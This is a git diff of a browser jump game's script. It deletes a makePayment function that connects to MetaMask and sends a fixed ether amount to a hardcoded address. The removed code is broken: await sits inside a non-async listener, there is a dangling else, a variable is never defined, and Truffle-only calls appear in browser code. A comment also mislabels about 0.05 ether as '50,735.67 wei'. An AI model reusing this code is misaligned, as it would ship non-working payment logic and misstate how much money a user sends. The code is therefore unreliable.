@@ -9,7 +9,6 @@ const username = document.getElementById('username');
 
 const scoreBoard = document.getElementById('score');
 
-let Web3;
 let isJumping = false;
 let score = 0;
 let obstacles = [];
@@ -165,60 +164,3 @@ function getUsername(e) {
   gameInsights.innerHTML = `Hello ${name}! <br> Use spacebar to jump.`;
 }
 
-async function makePayment() {
-    try {
-        // Check if MetaMask is installed and has an Ethereum provider
-       window.addEventListener('load', () => {
- // Wait for loading completion to avoid race conditions with web3 injection timing.
-  if (window.ethereum) {
-    const web3 = new Web3(window.ethereum);
-    try {
-      // Request account access if needed
-      await window.ethereum.enable();
-      // Accounts now exposed
-      return web3;
-    } catch (error) {
-      console.error(error);
-    }
-  }
-  // Legacy dapp browsers...
-  else if (window.web3) {
-    // Use MetaMask/Mist's provider.
-    const web3 = window.web3;
-    console.log('Injected web3 detected.');
-    return web3;
-  }
-  // Fallback to localhost; use dev console port by default...
-  else {
-    const provider = new Web3.providers.HttpProvider('http://127.0.0.1:9545');
-    const web3 = new Web3(provider);
-    console.log('No web3 instance injected, using Local web3.');
-    return web3;
-  }
-});
-
-            const PaymentContract = artifacts.require('PaymentContract');
-            const contractAddress = '0x577011Da8e9272ce8345A3fe43BD2d01aB31899F';
-            const contractABI = PaymentContract.abi;
-
-            const web3 = new Web3(window.ethereum);
-            const contract = new web3.eth.Contract(contractABI, contractAddress);
-
-            const recipientAddress = '0x6A3A0eeDe87c645B693F7a4D4d560298f5d0508B'; // Destination address
-            const weiAmount = '50735670000000000'; // 50,735.67 wei
-
-            // Send payment from the user's address
-            await contract.methods.makePayment(recipientAddress).send({
-                from: sourceAddress,
-                value: weiAmount
-            });
-
-            alert("Payment successful!");
-        } else {
-            alert("MetaMask or similar Ethereum wallet not found.");
-        }
-    } catch (error) {
-        console.error(error);
-        alert("Payment failed. Check the console for error details.");
-    }
-}
